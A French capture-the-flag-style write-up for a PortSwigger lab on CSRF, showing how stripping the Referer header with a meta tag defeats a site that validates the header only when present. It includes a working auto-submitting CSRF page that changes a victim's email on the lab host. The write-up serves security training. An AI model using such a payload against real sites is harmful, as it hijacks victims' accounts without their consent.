# Lab

https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

## Solution

Quand on génère un POC CSRF, et qu'on le visite, on obtient l'erreur : `Invalid Referer header`

Avec une simple recherche `CSRF Bypass Referer`, on tombe sur ce [lien](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses) nous indiquant que le header `Referer` peut être injecté par l'attaquant avec cette baliase : `<meta name="referrer" content="never">`

On génère donc un POC CSRF avec cette balise, et on l'envoie à la victime.

```html
<html>
<meta name="referrer" content="never">
  <body>
    <form action="https://0aba001603788119819d115500f800eb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwnde@mcdo.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Pourquoi ca fonctionne ?

Le site vérifie le contenu du header `Referer` pour s'assurer que la requête provient bien de son site.

Mais si le header n'est pas présent, il ne peut pas vérifier son contenu, et donc accepte la requête.

Ainsi, avec la balise `<meta name="referrer" content="never">`, on indique au navigateur de ne pas envoyer le header `Referer`, et donc le site accepte la requête.